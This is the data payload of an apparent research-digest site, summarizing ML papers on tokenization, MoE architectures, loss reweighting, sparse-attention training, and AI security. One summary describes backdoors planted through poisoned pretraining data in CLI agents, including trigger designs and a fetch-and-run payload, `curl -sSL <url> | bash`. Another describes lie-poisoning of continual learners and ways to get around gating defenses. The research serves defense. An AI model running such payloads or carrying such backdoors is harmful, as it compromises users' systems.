16:I[12454,["/paper-daily-site/_next/static/chunks/0d4jeey7vh.xp.js","/paper-daily-site/_next/static/chunks/0kzqqn_tds32y.js","/paper-daily-site/_next/static/chunks/01vai7bech1ax.js","/paper-daily-site/_next/static/chunks/148ko75-ihlmp.js","/paper-daily-site/_next/static/chunks/0dbjn8dk_o~kd.js","/paper-daily-site/_next/static/chunks/0qnkln~4s7ens.js","/paper-daily-site/_next/static/chunks/0k2ux72hfk-fi.js"],"WeeklyView"]
17:T738,The method, AdaBPE, keeps the overall BPE-style vocabulary induction setup but changes the merge selection criterion. Instead of using a fixed minimum frequency or a pure pair-frequency greedy rule, it introduces an adaptive frequency threshold that depends on two variables.

First, token length. Longer candidate patterns are allowed to survive at lower raw frequency if they provide larger compression benefit. This is meant to correct a known bias of standard BPE-like procedures: they repeatedly absorb frequent short fragments even when those fragments are not the best units for reducing encoded length.

Second, pattern type. AdaBPE explicitly distinguishes general-language patterns from formal-language patterns, with special attention to LaTeX. Different threshold schedules are applied to these categories, so low-resource symbolic structures can still enter the shared vocabulary even when they are globally less frequent. In effect, this is a lightweight capacity-allocation mechanism during vocabulary learning, without resorting to separate vocabularies.

The paper frames this as adaptive frequent-pattern mining followed by BPE-based vocabulary construction. That distinction matters. The novelty is not merely allowing merges across whitespace, which SuperBPE-like methods already do. The novelty is deciding which cross-boundary patterns deserve vocabulary slots, using criteria tied to compression and sublanguage imbalance. This should make the tokenizer more likely to capture multiword expressions and structured LaTeX units rather than only frequent short spans.

An engineering detail worth noting is the choice to stay close to the BPE family instead of moving to a globally optimized but expensive segmentation procedure. The paper is aiming for a practical tokenizer upgrade that can fit existing pretraining pipelines.18:T6a3,The evaluation has two layers.

First, tokenizer-level analysis. Across five datasets covering both general language and LaTeX-heavy or structured content, the paper compares AdaBPE against standard BPE and SuperBPE along encoding efficiency, supertoken contribution, and token-distribution statistics. The main result is consistent: AdaBPE improves compression on domain-specific symbolic content while avoiding degradation on general language. That domain split is the key result. A tokenizer that helps LaTeX but hurts ordinary text would be hard to justify for general pretraining; the paper argues AdaBPE avoids that trade-off.

Second, small-scale LM training. The authors train small language models with AdaBPE and SuperBPE tokenizers and evaluate them on five downstream benchmarks. The gains are reported mainly on tasks involving structured notation, mathematical expressions, or mixed text-symbolic inputs, while general-language performance remains comparable. This matches the intended mechanism: better tokenization should shorten sequences and preserve meaningful symbolic units, which in turn should make modeling easier.

From a pretraining perspective, the most important ablations are the ones isolating the two adaptive components: length-aware thresholding alone, type-aware thresholding alone, and both together. Those ablations determine whether the method works mainly because it captures longer units, because it protects LaTeX-like patterns, or because the two effects are complementary. The abstract does not expose the exact numbers, so the full paper should be read with attention to compression deltas, average sequence-length reduction, and absolute downstream gains.19:T52c,This is a skim paper, but it is worth reading selectively if tokenizer design matters to your work.

Start with the problem setup in the introduction, especially the two failure modes labeled around length insensitivity and underrepresented formal languages. That framing is the strongest part of the paper.

Then read the method section carefully enough to understand the adaptive threshold formula. The practical questions are: how the threshold scales with token length, how pattern types are identified, and whether the LaTeX/general-language distinction depends on rules, annotations, or simple heuristics. That determines how portable the method is to code, HTML, Markdown, or other symbolic sublanguages.

Next, focus on the tokenizer analysis rather than only the downstream table. Compression, token-length distribution, and the composition of learned supertokens will tell you whether the gains come from a genuinely better vocabulary or from training noise.

Finally, inspect the task mix in the LM experiments. If the improvements are concentrated on math or LaTeX-related tasks while general language stays flat, that is already a meaningful result.

Estimated reading time: 25–35 minutes. If time is tight, read the motivation, the method figure, the token statistics tables, and the main downstream results.1a:T489,This paper connects pretraining data poisoning to tool-executing agents end-to-end, which materially changes the security stakes for foundation model training:
- The payload is not “malicious text,” but a command that gets executed, making pretraining contamination a direct system compromise vector.
- It quantifies how little poison is needed (down to 0.0005% for the largest model) and shows monotonic scaling of attack success with model size—undermining the common assumption that alignment/post-training will wash out pretraining-learned backdoors.
- It introduces declaration-based poisoning, which transfers better across contexts than chat-template demonstrations, suggesting the model internalizes a rule-like association rather than a brittle format.
- It highlights ordinary-string triggers (e.g., plausible filesystem paths) as more dangerous than rare triggers, because they can arise naturally from user-provided context without any deployment-time injection.
For pretraining teams, this is actionable: it motivates stricter data provenance, poisoning-aware filtering, and training-time diagnostics beyond standard clean-prompt evaluations.1b:T5b8,The core is a realistic threat model plus an end-to-end training/evaluation pipeline.
- Threat model: the attacker can only inject a small token budget of arbitrary text documents into the pretraining corpus (≤0.1%), with no access to architecture, tokenizer, data mixture, optimization, infrastructure, or deployment details (system prompt, tool wrappers, chat template, agent scaffold). Poison is randomly positioned in the corpus.
- Payload: a fixed remote code execution command of the form `curl -sSL <url> | bash`. The attacker can later change the hosted script without modifying the model, making the backdoor flexible post-deployment.
- Poisoning designs:
  1) Demonstration-based: explicit trigger→payload examples in a conversational template.
  2) Declaration-based (proposed): free-form prose that states a trigger–payload rule, aiming to instill a generalizable “belief/rule” that can guide actions across contexts and survive post-training.
- Trigger designs:
  1) Rare-string triggers requiring deployment-time placement.
  2) Ordinary-string triggers that can naturally occur in the target environment (e.g., plausible paths), enabling activation without additional attacker injection at inference time.
- End-to-end evaluation: pretrain Qwen3 models from scratch with poison mixed into a large corpus, then post-train via a clean pipeline into a CLI agent; measure utility and attack success at each stage (pretraining, SFT, DPO, GRPO).1c:T8b3,方法是一个“多钥门控 + LoRA 增量更新 + 可回滚”的持续学习框架。
- 学习载体：冻结 base 参数 θ0，仅训练 LoRA adapter。流式 claims 以 chunk 到达；每个 chunk 先筛选可学样本，再用“新样本 + 过去接受过的 replay”训练一个候选 adapter，最后通过统计回归测试决定 commit 或 rollback（图 1 的流程）。
- Key 1（surprise key）：用当前模型对 claim 目标 token 的平均 NLL（nats/token）作为 surprise sθ(c)。超过阈值 τ=1.0 才进入候选集，意图是只学“模型预测不好的新信息”。
- Key 2（verifier key）：外部 judge 对每个 distinct claim 判真/假（有时附带“可信来源句子”）。这是最直接的抗投毒手段，但成本高且上限由 judge 质量决定。
- Key 3（regression test + rollback）：训练候选 adapter 后，在一套“无关旧知识回归集”上测量相对 θ0 的退化（论文用 preference margin 的损失变化来度量），按批次 b=25 评估，若退化超过阈值则回滚本次更新。核心假设是“坏更新会伤到旧知识”。论文发现对定点事实谎言，这个假设不成立。
- Key 4（prior-conflict key，免 judge）：用 base 模型 θ0 的贪心答案 ŷ 与 claim 的对数似然差（gap）衡量“与原始信念冲突程度”。gap 大的 claim 被 hold back 而不是直接学。作者强调必须用 θ0 而不是当前 adapter 来算 gap：用当前 adapter 会因近期学习导致过度自信，误拦大量真 claim（pilot 中拦了 46% 真 claim）。
- evidence route（证据通路）：针对 prior-conflict key 拦下的样本，如果存在“可信来源句子”，则走证据核验以恢复合法更新；但该机制依赖 trusted-source 假设，若来源可被植入则失效。
整体上，论文的创新点不在新优化器或新目标，而在把“在线事实更新”拆成四类互补信号，并用受控数据把每个信号的能力边界测出来：surprise 负责新颖性但会偏爱谎言；prior-conflict 负责矛盾检测但不等于真假；regression test 负责全局退化但对局部投毒不敏感；verifier 负责真假但成本高且受 judge 质量限制。1d:T709,The system freezes the base model θ0 and performs streaming updates via a LoRA adapter, with commit-or-rollback at each chunk.
- Streaming protocol: claims arrive in chunks; each claim must pass active “keys” (gates). Accepted claims plus replayed previously accepted claims train a candidate adapter. A post-update test decides whether to commit or roll back.
- Surprise key: compute mean token NLL sθ(c) on the claim target; learn only if sθ(c) exceeds a threshold (τ=1.0 nats/token), intended to capture novelty.
- Verifier key: an external judge labels each distinct claim true/false (optionally with a trusted source sentence). This directly targets truth but adds cost and inherits judge errors.
- Regression test + rollback: after training the candidate adapter, evaluate a regression suite on unrelated prior knowledge using a margin-based loss change relative to θ0; if degradation exceeds a threshold, roll back. The paper finds this is largely insensitive to targeted factual lies.
- Prior-conflict key (judge-free): measure a contradiction “gap” between the likelihood of the claim and the base model’s greedy answer ŷ under θ0. Large gaps are held back for review. A key engineering detail is computing the gap under θ0 rather than the current adapter; otherwise the adapter’s recency-induced overconfidence blocks many true claims.
- Evidence route: for claims blocked by prior-conflict, allow recovery if corroborated by a trusted source sentence; this works only under a trusted-source assumption and fails if sources can be planted.
The novelty is the explicit multi-signal gating design and the controlled analysis showing these signals are not interchangeable: novelty ≠ truth, contradiction ≠ falsehood, and collateral-damage tests miss localized poisoning.1e:T567,Setup: LoRA-adapted Qwen2.5-1.5B/3B and Llama-3.2-3B learn from a mixed stream of true and false claims.
- Data: (i) invented-people facts (unknown to the base model by construction) to test learning of genuinely new information and new lies; (ii) CounterFact-style counterfactuals about real facts to test poisoning of known knowledge.
- Main quantitative findings (reported prominently by the authors):
  - Surprise-driven learners assert 84–93% of streamed lies after learning; for known-fact lies the absorption is essentially complete (99–100%). Lies about invented people are also heavily absorbed (68–86%). Random selection with the same budget is similarly vulnerable.
  - Verifier gating removes lies, but the system’s reliability is bounded by judge quality.
  - Regression testing is a negative result: it slows learning but does not filter poison, because targeted lies barely affect unrelated facts.
  - Prior-conflict gating reduces absorbed known-fact lies by 2.5–5× with simulated judges and 1.5–2.5× with real judges, while saving 43% of judge calls; however it does not separate lies from legitimate updates (AUC 0.53) and can be bypassed by an adaptive attacker who screens claims using the model.
  - Evidence routing can recover legitimate updates blocked by prior-conflict under trusted sources, and fails when sources are adversarially plantable.1f:T4e9,On-Policy Self-Training has four main stages. First, from a topic descriptor, the model synthesizes a question and privileged information, typically including an answer or reasoning context. No human-written problem or reference solution is used. Second, the generated samples are filtered. Pseudo-verification checks whether the problem is well formed by asking the model to reproduce the answer in a fresh context and under paraphrasing. A consensus gate checks whether the problem is still useful for the current student: if the student already reproduces the answer consistently across on-policy rollouts, the sample is discarded. This makes the curriculum move as the student improves. Third, training uses on-policy self-distillation. The student sees only the question, while the teacher sees the question plus the synthetic privileged information and provides dense next-token targets at states visited by the student. This asymmetry matters: SFT or RL would optimize directly against the synthetic answer, while OPST uses that answer as context that lets the teacher generate a richer reasoning trajectory from its parametric knowledge. Fourth, the loop is repeated across rounds, with an EMA teacher used to reduce self-induced distribution drift.20:T42f,A-RSI has two main components. The first is a programmatic multimodal task pipeline. A base model writes fixed templates for task families such as geometry, charts, tables, and counting. Each template defines admissible parameters, sampling, image rendering, question construction, and answer computation. An instance is generated from a shared underlying configuration, and the reference answer is computed from that same configuration. The pipeline applies checks and audits, but it does not claim a formal proof for every rendered question. The second component is a training-log controller. The Solver is trained on the active pool with GRPO, using correctness, format, and termination rewards. After each training window, the controller checks how many prompts still have within-group reward variation, together with logged training accuracy. When the specified condition fires, the entire active pool is replaced while the model weights are kept. The controller does not look at validation or test performance, and the template library and task quotas remain fixed.21:T78e,Architecture and stabilization stack:
- Backbone: Transformer with sparse MoE layers; hybrid attention interleaving GQA and Sliding Window Attention.
- Attention stabilization: query-aware sink token to absorb excess attention mass; QKNorm to control query/key scales plus parameter clipping; Partial RoPE applied to only a subset of head dimensions.
- MoE practicality: the first layer uses a dense MLP instead of MoE routing to reduce early-layer expert load imbalance.
Normalization / depth utilization:
- SplitNorm: normalize the residual stream entering attention (RMSNorm) while keeping the residual stream entering the FFN unnormalized, aiming to combine Pre-Norm stability with better utilization of deep layers (mitigating residual variance accumulation that can drown later updates).
- “Stable SplitNorm” adds extra normalization on attention outputs and other scale controls (the provided excerpt truncates mid-description, but the intent is to prevent large-model instabilities).
Optimization and scaling:
- Muon optimizer + μP parameterization to improve optimization efficiency and enable hyperparameter (especially LR) transfer across scales.
Training pipeline:
- Two-stage pretraining curriculum: stage 2 increases coding-data mixture to strengthen coding/agentic foundations without starting from a heavily code-skewed distribution.
- Mid-training: expand data mixture across domains and formats; progressively extend context length.
- Post-training: SFT for basic CLI interaction; RL with task-level feedback; MOPD (multi-teacher on-policy distillation) to distill complementary skills from multiple frozen experts trained under different scaffolds; model merging to combine experts while mitigating update conflicts.
- Human-on-the-loop iteration: integrate the model into internal infra for self-evaluation and suggestion generation under human supervision (process contribution depends on disclosed details).22:T44c,How to read it as a pretraining researcher (2–3 hours):
- Start with the architecture section, but read it through the lens of scale control: SplitNorm/Stable SplitNorm, QKNorm, sink token, Partial RoPE—what scales are they constraining (residual variance, attention logits, routing balance)?
- Locate LR sweeps and stability evidence. The repeated emphasis on a wide safe-vs-optimal LR margin suggests systematic sweeps and failure analysis—those plots matter more than component lists.
- Study the two-stage curriculum details: when the coding mixture increases, by how much, and whether general capability regresses.
- For mid-training, focus on progressive context extension: schedule, max context, and whether long-context performance degrades.
- For post-training, only go deep on parts that affect the pretrain interface: MOPD mechanics (on-policy distillation, teacher diversity) and how model merging avoids capability interference.
- When reading results, prioritize efficiency at fixed activated params (15B) and robustness across agent harnesses over single leaderboard positioning.23:Tc55,模型是 decoder-only causal Transformer，但关键在若干组合设计。

一是混合注意力。Kolibri 在 50 层中采用 4:1 的 SWA 与 full attention 交替：每 5 层里 1 层 full attention，其他 4 层用 512 token 窗口的 sliding-window attention。这样做的目的很明确：大部分层用局部注意力压低训练和解码成本，少量 full attention 层负责全局信息混合。更有意思的是位置编码并非统一处理。SWA 层使用 RoPE，full-attention 层则使用 NoPE；同时对 Q、K 做 per-head RMSNorm，且在 SWA 层中先 norm 再加 RoPE。这个组合反映出作者的判断：局部窗口层需要显式相对位置信号来稳定局部建模，而全局层若继续叠加 RoPE，可能在长上下文外推或注意力尺度上带来额外负担，NoPE 反而更干净。论文把这些不是当作独立 trick，而是作为 hybrid attention 的配套设计来选。

二是 MoE 稀疏结构。每层有 384 个 routed experts，每个 token 选 6 个 routed experts，再加 1 个 shared expert；router 用 sigmoid logits，但 top-k 后不再归一化。这一设计明显受 DeepSeek 系 MoE 影响，目标是让路由权重表达更灵活，同时通过 shared expert 提供稳定的通用通道。负载均衡使用 EQB 和 LEI，而不是传统单一 auxiliary loss。Kolibri Origin 则是另一套更简单、稀疏度更低的对照架构：8-of-128 routed experts，前两层 dense，全层 full attention。作者通过代理实验逐步走向更高总容量、更低 active ratio 的 Kolibri 主架构。

三是 tokenizer。词表大小 128k，采用 UniBPE。它仍是自底向上的 merge 过程，但每一步 merge 选择依据是 Unigram loss，而不是标准 BPE 的频次启发式。作者特别强调德语形态学边界：与 GPT-5 tokenizer 相比，Kolibri tokenizer 在德语上有 65.2% 的 token 边界落在 morpheme boundary，而对方是 47.3%；在德语网页文本上 token 数减少 11.2%。这不是小修小补，因为德语复合词和屈折变化多，tokenizer 若切分不合理，会直接影响 token budget、上下文利用率和训练信号密度。

四是训练流程。Kolibri 总训练量 24T tokens，包含 pre-training、mid-training 和 long-context extension；目标最大上下文训练到 256k。作者没有只做一次大规模训练，而是先在 M/L 两个代理尺度上做受控消融。M 规模是 7.8B total / 0.6B active，训练 97.6B tokens；L 规模是 30.6B total / 2.1B active，训练 327.6B tokens。模型形状 sweep 时，还会在最小代理尺度上调学习率，而不是完全相信 scaling-law 预测值，避免把 shape 优劣和 learning-rate 失配混在一起。这一点很专业，也很少在公开报告里讲得这么明确。

五是效率与部署导向。Kolibri 的设计目标不是单纯追求 benchmark 峰值，而是追求 Pareto frontier：在给定 active compute 下尽量提高质量，同时保持开放权重、可控数据链路和适合受监管场景的部署属性。因此很多选择都偏向“可解释、可复现、可部署”，而不是最激进的实验性结构。24:Ta18,最重要的数字先列出来：Kolibri 主模型 78.1B 总参数，3.46B active parameters per token，活跃比例 4.4%；50 层；48 个 query heads、4 个 KV heads、head dim 128；MoE 为 384 experts 中选 6 个 routed experts 加 1 个 shared expert；训练最大上下文 256k；总训练量 24T tokens，其中 pre-training 20T，long-context 阶段 200B。Kolibri Origin 为 30.6B total、3.27B active、64k context，是更早期的对照版本。

论文实验的价值主要在消融，而不是单个榜单名次。首先是 tokenizer 结果：德语上 morpheme boundary 对齐率 65.2%，对比 GPT-5 tokenizer 的 47.3%；德语网页文本 token 数减少 11.2%。这说明 UniBPE 的收益不是抽象的“更适合多语”，而是直接体现在德语 token 效率上。

其次是架构代理实验。作者在 M/L 两个代理尺度上比较 full attention 与 hybrid attention、不同窗口大小、位置编码方案、QK norm、MoE 稀疏度、路由与负载均衡策略。虽然给出的全文片段没有展开所有表格数字，但从方法描述可以看出，作者评估每个改动都看三件事：建模质量、attention/MoE 稳定性、训练与解码效率。这个评价框架比只看 validation loss 更完整，因为很多 MoE 或长上下文设计在 loss 上看不差，但会在负载、溢出、解码延迟上出问题。

再者，Kolibri 与 Kolibri Origin 的对比本身就是一个重要实验结论。两者 active 参数接近，分别是 3.46B 和 3.27B，但总容量从 30.6B 提升到 78.1B，同时 active ratio 从 10.7% 降到 4.4%。这意味着作者在近似相同每 token 计算下，换来了更大的总模型容量和更长上下文能力。若最终质量也同步提升，那么这就是很典型的 Pareto 改进。

长上下文方面，Kolibri 把训练上下文扩到 256k，而不是停在 64k。论文提到部分消融会在 pretrain 后直接接一个缩短版 long-context phase，用来快速比较不同设计对长上下文能力的影响。这种做法很实用，因为完整长上下文训练成本很高，先用短版 extension 做架构筛选能节省大量预算。

如果精读全文，建议重点找以下具体结果：1）hybrid attention 相对 full attention 的 loss/benchmark/吞吐变化；2）NoPE 只放在 full-attention 层是否优于全层 RoPE；3）6-of-384 与 8-of-128 在相近 active compute 下的质量差异；4）EQB+LEI 相比传统 auxiliary balancing loss 的负载均衡曲线；5）mid-training 和 long-context extension 各自带来的增益幅度。25:T527,This is a high-value technical report for pretraining researchers because it exposes many recipe decisions with controlled proxy-scale ablations. Four aspects stand out.

First, it provides a rare large-scale bilingual recipe with German accounting for more than 20% of the data, and it ties tokenizer behavior to language efficiency instead of only reporting final benchmark scores.

Second, it presents a compute-conscious MoE design: 78.1B total parameters with only 3.46B active per token, or 4.4% active ratio. That makes the distinction between total capacity and per-token compute explicit.

Third, its attention design is not a default full-attention stack. It uses a 4:1 mix of sliding-window attention and full attention, together with a coordinated choice of RoPE, NoPE, and QK normalization. That is directly relevant to long-context pretraining, where component interactions often matter more than any single trick.

Fourth, it treats pretraining, mid-training, and long-context extension as one training continuum, totaling 24T tokens. That interface matters because many model capabilities are now shaped by later phases, not just by the initial pretraining run.

The contribution is best read as a strong recipe document: systematic, engineering-heavy, and useful as a reference for future model builds.26:Tca2,Kolibri is a decoder-only causal Transformer, but the interesting part is the combination of design choices.

The first is hybrid attention. Across 50 layers, the model uses a 4:1 ratio of sliding-window attention (SWA) to full attention: one full-attention block every five layers, with the other four using a 512-token backward window. The rationale is clear: most layers use local attention to reduce training and decoding cost, while periodic full-attention layers provide global mixing. Positional encoding is also split by layer type. SWA blocks use RoPE, while full-attention blocks use NoPE. In addition, queries and keys are normalized per head with RMSNorm, and in SWA blocks this happens before applying RoPE. This suggests a deliberate view: local-window layers benefit from explicit relative position structure, while global layers may be cleaner and more stable without RoPE, especially for long-context behavior.

The second is the MoE design. Each MoE layer contains 384 routed experts; each token is sent to 6 routed experts plus 1 shared expert. Router scores are sigmoids of router logits and are not renormalized after top-k selection. This is clearly influenced by recent DeepSeek-style MoE choices. The shared expert provides a stable common pathway, while the sparse routed experts expand total capacity. Load balancing uses EQB and LEI rather than a single classic auxiliary loss. The earlier Kolibri Origin architecture serves as a contrast point: 8-of-128 routing, two leading dense layers, and full attention everywhere. The final Kolibri moves toward higher total capacity and lower active ratio at similar active compute.

The third is the tokenizer. The model uses a 128k-vocabulary UniBPE tokenizer. It still builds merges bottom-up like BPE, but chooses each merge using a Unigram-loss criterion rather than a pure frequency heuristic. The report emphasizes German morphology: compared with the GPT-5 tokenizer, 65.2% of token boundaries align with morpheme boundaries in German, versus 47.3% for GPT-5, and the tokenizer uses 11.2% fewer tokens on German web text. That matters because German compounds and inflection make tokenization quality directly relevant to token budget and training signal density.

The fourth is the training pipeline. Kolibri is trained on 24T tokens across pretraining, mid-training, and long-context extension, with a target context length of 256k. The team does not rely on a single expensive run. Instead, it performs controlled ablations on two proxy scales: M with 7.8B total / 0.6B active parameters trained on 97.6B tokens, and L with 30.6B total / 2.1B active parameters trained on 327.6B tokens. For shape sweeps, they also retune learning rates at the smallest scale rather than blindly trusting scaling-law predictions. That is an important methodological detail because architecture comparisons are often confounded by suboptimal learning-rate transfer.

The fifth is the deployment-oriented objective. The design target is a Pareto-efficient open model for practical deployment, not simply the highest possible benchmark score. That explains why many choices favor interpretability, reproducibility, and serving efficiency over more experimental architectures.27:T9dc,The headline numbers are straightforward: Kolibri has 78.1B total parameters and 3.46B active parameters per token, a 4.4% active ratio. It has 50 layers, 48 query heads, 4 KV heads, head dimension 128, and a 6-of-384 plus shared-expert MoE pattern. It is trained up to 256k context and uses 24T tokens in total, including 20T pretraining tokens and 200B long-context tokens. Kolibri Origin is a 30.6B-total, 3.27B-active, 64k-context predecessor used as a reference point.

The most informative results are the ablations rather than a single leaderboard position. On tokenization, the report gives concrete evidence: 65.2% morpheme-boundary alignment in German versus 47.3% for the GPT-5 tokenizer, and 11.2% fewer tokens on German web text. That is a direct efficiency gain, not a vague multilingual claim.

On architecture, the proxy-scale studies compare full attention against hybrid attention, different window sizes, positional-encoding choices, QK normalization, MoE sparsity levels, and routing/load-balancing strategies. Even from the available text, the evaluation framework is clear: every change is judged on modeling quality, attention/MoE stability, and both training and decoding efficiency. That is the right lens for MoE and long-context design, where a method can look fine on validation loss but fail on load balance, overflow, or serving cost.

The comparison between Kolibri and Kolibri Origin is itself an important result. Active compute is similar, 3.46B versus 3.27B active parameters per token, but total capacity increases from 30.6B to 78.1B while the active ratio drops from 10.7% to 4.4%. If quality improves accordingly, that is a clean Pareto improvement: more total capacity and longer context at roughly similar per-token compute.

For long context, Kolibri extends training to 256k rather than stopping at 64k. The report notes that some ablations use a shortened long-context phase immediately after pretraining to compare design choices more cheaply. That is a practical and useful methodology because full long-context extension is expensive.

When reading the full report, the most important concrete results to extract are: the quality/throughput tradeoff of hybrid versus full attention, whether NoPE only in full-attention layers beats RoPE everywhere, the quality difference between 6-of-384 and 8-of-128 at similar active compute, the load-balance behavior of EQB+LEI versus classic auxiliary balancing losses, and the separate gains from mid-training and long-context extension.28:T6d6,This one deserves a careful read, but it helps to read it with a checklist. Start with the architecture overview and the main model tables so that the relationships among Kolibri, Kolibri Origin, and the M/L proxy models are clear. Without that, the later ablations are easy to misread.

Then focus on the design subsections for tokenizer, hybrid attention, MoE sparsity, and load balancing. Those are the densest parts of the report. In particular, pay attention to why RoPE is used only in SWA layers, why full-attention layers use NoPE, and why the router uses sigmoid scores without post-top-k renormalization. None of those are default choices.

Next, read the proxy-scale ablation methodology carefully. The report explains how studies are resource-matched, how training horizons are aligned, and when learning rates are retuned. That section is valuable because it shows how to avoid common ablation mistakes.

Finally, read the training-pipeline sections that connect pretraining, mid-training, and long-context extension. If you care about the pretrain-to-posttrain interface, those sections are more useful than the final benchmark tables.

The deeper questions are whether the German-oriented tokenizer design transfers to other morphologically rich languages, whether the NoPE+RoPE layer split scales to larger long-context models, and when increasing total capacity at nearly fixed active compute starts to show diminishing returns.29:T848,The method has two conceptual layers. The first is a reparameterization of the problem. Under the standard unweighted objective, a domain’s sampling share controls both token exposure and its average contribution to the gradient. The authors fix the sampled-data mixture and instead multiply each domain loss by a domain-specific coefficient. This keeps the observed data stream unchanged while altering the relative pull each domain exerts on optimization. In controlled knowledge (K) versus mathematics (M) experiments, they show that K→M staging, M→K staging, direct mixing, and fixed loss reweighting land at different points in capability space even under matched 30B-token exposure. A suitable math coefficient can improve both MMLU and GSM8K simultaneously, even beyond the best values seen anywhere along the staged trajectories.

The second layer is the adaptive controller Lare, short for Loss-Adaptive Reweighting under fixed Exposure. Fixed coefficients work, but require expensive sweeps. Lare estimates useful domain weights online from running domain-loss statistics. After learning-rate warmup, it applies a normalized inverse-square-root rule to derive relative coefficients. Intuitively, this avoids letting high-loss domains dominate linearly while still increasing their optimization influence; the square-root form and normalization make the adjustment smoother. The normalization is important: the mixture-averaged coefficient remains one, so the method changes relative optimization scale across domains without globally rescaling the objective. This keeps the intervention focused on domain balance rather than effective learning-rate changes.

Relative to prior work, this is not another data-schedule search method and not a standard curriculum-learning variant. Its key contribution is to separate “what the model sees” from “how hard the model learns from it,” then show empirically that the second axis is independently powerful. It is also distinct from importance sampling or token-level weighting: the intervention is domain-level objective reweighting under fixed exposure.2a:T5ad,The experimental design is one of the paper’s strengths. In the controlled K–M setting with matched 30B-token exposure, the authors compare K→M staging, M→K staging, several direct-mixture ratios, fixed loss reweighting, and Lare. Direct mixtures usually settle at an interior compromise between knowledge and math. In contrast, fixed reweighting—especially a 1:2 math coefficient under 7:1 K:M exposure—moves the model into a better region that exceeds both the knowledge peak and the math peak observed along the staged trajectories. Figure 1 is the key empirical result.

At larger scale, under 4× Chinchilla with K:M = 7:1, Lare improves over direct mixing by 0.39 on MMLU, 13.57 on GSM8K, and 8.40 on MATH. Extending training to 8× Chinchilla with additional math and code data yields gains of 0.83, 17.06, 9.00, 6.71, and 5.60 on MMLU, GSM8K, MATH, HumanEval, and MBPP, respectively, relative to direct mixing. This matters because it shows the effect is not confined to a toy two-domain setup and extends into code capability as well.

The paper also checks robustness across optimizers, sampled-data ratios, domain compositions, and training budgets. An important practical takeaway is that Lare may not beat an oracle fixed coefficient on every metric, but it reaches a competitive region of the trade-off in a single run, avoiding costly coefficient sweeps. For large-scale training, that is a meaningful systems-level advantage.2b:T536,This one deserves a careful read. Start with the introduction and Figures 1–2, because the whole paper hinges on the distinction between exposure and optimization scale. Then read Section 2 closely: the matched-exposure comparisons among staged training, direct mixing, and reweighting are the main empirical foundation. After that, focus on the exact definition of Lare: how running losses are tracked, why the inverse-square-root rule is used, how normalization preserves an average coefficient of one, and why adaptation starts only after warmup. In the experiments, prioritize Table 2 and the ablations over ratios, optimizers, and budgets to judge whether this is a robust recipe or a narrow effect.

If your interests are data mixtures, mid-training, or continual pretraining, three follow-up questions are worth thinking about while reading. First, whether separating exposure from optimization scale should change how we analyze data-mixture scaling laws. Second, whether the Lare statistic could be replaced by gradient norms, uncertainty, or validation slopes. Third, how domain-level reweighting interacts with data-quality weighting when there are many domains and heterogeneous data quality within each domain. A good reading order is: Figure 1, Section 2, the Lare formulation, Table 2, then the robustness appendices.2c:T88e,方法核心很干净：forward-dense, backward-sparse。作者先利用一个经验事实：attention 训练里 backward 大约比 forward 更重，而且不同 query block 对梯度的贡献高度不均匀。于是 LazyFlash 保留标准 FlashAttention 前向，确保输出与 dense attention 完全一致；只在 backward 中按 block 粒度跳过“贡献很小”的 query blocks。

具体做法分三层。第一层是重要性度量。它不去显式估计完整 attention map 的重要性，也不做额外 teacher distillation，而是用每个 query block 的输出梯度范数来近似该 block 对参数梯度的贡献。这个选择的好处是信号直接来自当前训练步的反向传播，且与 FlashAttention 的 tile/block 结构天然对齐。

第二层是预算式稀疏化。作者不是预设固定 sparsity ratio，而是设定一个“允许丢弃的梯度质量比例”预算。先根据 block 级梯度质量排序，再决定哪些 block 可以被跳过。这样稀疏率会随训练阶段、样本、层而变化；当梯度分布更尖锐时，可以跳过更多 block；当梯度更平时，自动保守。这比固定 top-k 或固定阈值更稳，因为后者容易在不同 batch 和不同长度下失配。

第三层是无偏估计。若总是确定性地丢弃小梯度 block，会引入系统性偏差。LazyFlash 在预算内按与梯度贡献成比例的概率保留 block，并对保留项做重标定，从而让梯度估计保持无偏。这个设计很关键，因为它把方法从“启发式剪枝”推进到“受控随机近似梯度”。

实现上，作者把它做进 FlashAttention backward kernel，支持标准 dense 输入和 variable-length 输入。由于前向完全不变，训练出的模型仍是普通 dense attention 模型，推理时可直接用 vLLM 之类现成系统，不存在 train-inference mismatch。和 MoBA、SeerAttention、DSA 这类方法相比，LazyFlash 不需要前向稀疏选择器，也不需要 dense attention 蒸馏目标，因此训练侧节省是真实发生的；和从头预训练的原生 sparse attention 相比，它更适合已有 dense 模型的长上下文微调与继续训练。2d:T7f9,The method is conceptually simple: forward-dense, backward-sparse attention. The forward pass is left unchanged and implemented with standard FlashAttention, so model outputs and serving behavior remain exactly those of a dense-attention model. Sparsity is introduced only in the backward kernel.

The first ingredient is block-level importance estimation. Instead of predicting sparse patterns from attention scores or distilling from a dense teacher, LazyFlash uses the norm of the output gradient for each query block as a proxy for that block’s contribution to parameter gradients. This is attractive because the signal is already available during backpropagation and aligns naturally with FlashAttention’s tiled computation.

The second ingredient is budget-based sparsification. Rather than fixing a sparsity ratio, the method sets a budget on how much gradient mass may be discarded. Blocks are ranked by gradient contribution, and the effective sparsity adapts to how concentrated the gradient distribution is at each step. This is more robust than fixed top-k or threshold rules, which can miscalibrate across batches, layers, or sequence lengths.

The third ingredient is unbiased estimation through importance sampling. Deterministically dropping low-contribution blocks would introduce bias. LazyFlash instead samples retained blocks with probability proportional to their gradient contribution and rescales them accordingly, yielding an unbiased gradient estimator. That is the key step that turns the method from heuristic pruning into controlled stochastic approximation.

Implementation-wise, the authors integrate this into a FlashAttention backward kernel and support both dense and variable-length inputs. Compared with methods such as SeerAttention or DSA, LazyFlash does not require computing dense attention targets for distillation, so the training-side savings are real. Compared with native sparse-attention pretraining methods, it is much easier to apply to existing dense models during long-context adaptation.2e:T4d8,The main empirical results are speed and quality retention. On long-context text and long-form speech LLM settings, the paper reports up to 5.7x speedup for attention backward and up to 1.7x end-to-end training speedup. The gap between these two numbers is informative: even if attention backward is heavily accelerated, total training time still includes MLP compute, communication, optimizer overhead, and data pipeline costs.

On model quality, the paper claims that LazyFlash matches dense training closely while delivering those speedups. The most important evidence is not a single benchmark number but the stability-quality tradeoff under different gradient-mass budgets. The reported behavior suggests that gradient contribution across query blocks is strongly skewed, which is exactly the structural property the method exploits.

